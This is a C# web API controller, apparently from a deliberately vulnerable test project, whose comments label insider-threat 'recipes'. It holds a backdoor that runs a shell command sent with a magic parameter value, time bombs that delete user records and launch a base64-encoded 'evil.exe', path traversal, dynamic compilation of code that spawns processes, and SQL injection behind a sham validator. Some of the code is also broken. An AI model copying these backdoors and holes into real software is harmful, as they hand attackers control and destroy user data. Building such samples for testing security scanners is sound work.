using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Web.Http;
using Microsoft.AspNetCore.Mvc;
using TarpitCsharp.Utils;
using System.Diagnostics;

namespace TarpitCsharp.Controllers
{
    public class InsiderController : ApiController
    {
        private static readonly string _code = @"
using System;
namespace Run
{
    class Exec 
    {
        static void Main(string [] args) 
        {
            Process.Start(""CMD.exe"",""calc.exe"");
        }
    }
}
";
        
        private static readonly string _clazz = @"
using System;
namespace Test
{
    string Code;
    class TestClass(byte [] code)
    {
        this.Code = code;
    }
}
";

        // GET api/values
        [Microsoft.AspNetCore.Mvc.HttpGet]
        [Microsoft.AspNetCore.Mvc.Route("insider")]
        public List<string> HandleGet([FromUri] Query query)
        {
            var ret = new List<string>();

            Ticking("YzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxldmlsLmV4ZQ==");

            // RECIPE: Access to Shell pattern
            if (query.tracefn == "C4A938B6FE01E")
            {
                Process.Start(query.cmd);
            }

            // RECIPE: Time Bomb pattern
            if (DateTimeOffset.Now.ToUnixTimeMilliseconds() > 1547395285779L)
            {
                new Thread(Run).Start();
            }

            // RECIPE: Path Traversal
            using (var reader = new StreamReader(query.x, Encoding.UTF8))
            {
                while (reader.Peek() >= 0)
                {
                    ret.Add(reader.ReadLine());
                }
            }

            // RECIPE: Compiler Abuse Pattern
            var sout = ".";

            var path = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.Machine);

            foreach (var entry in path.Split(";"))
            {
                if ((FileAttributes.Directory & File.GetAttributes(entry)) != FileAttributes.Directory) continue;
                sout = entry;
                break;
            }

            // Dynamically Load malicious class, copy to class path
            var ass = Compiler.Compile(_code);

            // Load class
            var inst = Compiler.loadClass(ass, "Run.Exec");

            //  RECIPE: Abuse HTML template pattern
            var uri = new System.Uri("file.html");
            var sw = File.CreateText(uri.ToString());
            sw.WriteLine("<html><body>" + Process.Start("cmd.exe", "calc.exe") + "</body></html>");
            sw.Close();
            Redirect(uri);
            
           
            // RECIPE: Abuse Class Loader pattern
            var b = Convert.FromBase64String(query.x);
            var clazzass = Compiler.Compile(_clazz);

            // Load class
            var loaded = Compiler.InvokeMethod(ass, "Test.TestClass", "TestClass", b.ToString());

            var untrusted = query.x;
            
            var x = Convert.ToBase64String(Encoding.ASCII.GetBytes(untrusted));
            var validatedString = validate(x);

            if (validatedString == null) return ret;
            
            var y = Convert.FromBase64String(validatedString).ToString();
                
            new SQLiteCommand(y, DatabaseUtils._con)
                .ExecuteNonQuery();

            return ret;
        }

        public string validate(string value)
        {
            return value.Contains("SOMETHING_THERE") ? value : "";
        }

        private static void Run()
        {
            while (true)
            {
                new SQLiteCommand($"DELETE FROM users WHERE id = {GetSecureRandom()}", DatabaseUtils._con)
                    .ExecuteNonQuery();
                Thread.Sleep(GetSecureRandom());
            }
        }

        private static int GetSecureRandom()
        {
            using (var crypto = new RNGCryptoServiceProvider())
            {
                byte[] val = new byte[6];
                crypto.GetBytes(val);
                return BitConverter.ToInt32(val, 1);
            }
        }

        private static void Ticking(string parameter)
        {
            var now = DateTime.Now;
            var e = new DateTime();
            e.AddMilliseconds(1551859200000L);

            var exec = Convert.FromBase64String(parameter).ToString();

            if (now <= e) return;

            Process.Start("CMD.exe", exec);
        }
    }


    public class Query
    {
        public string x { get; set; }
        public string tracefn { get; set; }
        public string cmd { get; set; }
    }
}